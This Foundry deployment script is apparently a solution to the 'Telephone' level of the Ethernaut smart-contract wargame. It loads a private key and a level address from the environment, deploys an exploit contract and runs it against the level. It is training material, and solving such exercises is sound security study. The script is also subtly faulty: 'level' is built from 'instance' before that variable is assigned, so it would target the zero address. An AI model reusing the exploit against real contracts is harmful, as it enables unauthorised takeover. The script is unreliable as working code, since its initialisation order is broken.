// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Telephone} from "src/04/Telephone.sol";
import {TelephoneExploit} from "src/04/TelephoneExploit.sol";

contract Exploit is Script {

        Telephone level = Telephone(instance); 
        TelephoneExploit public exploit;
        address instance = vm.envAddress("INSTANCE_LEVEL4");
        uint256 hacker = vm.envUint("PRIVATE_KEY");   
        address deployer = vm.rememberKey(hacker);
        
        function run() external {

            vm.startBroadcast(deployer);
            exploit = new TelephoneExploit();
            exploit.run(level);
            vm.stopBroadcast();
    }
}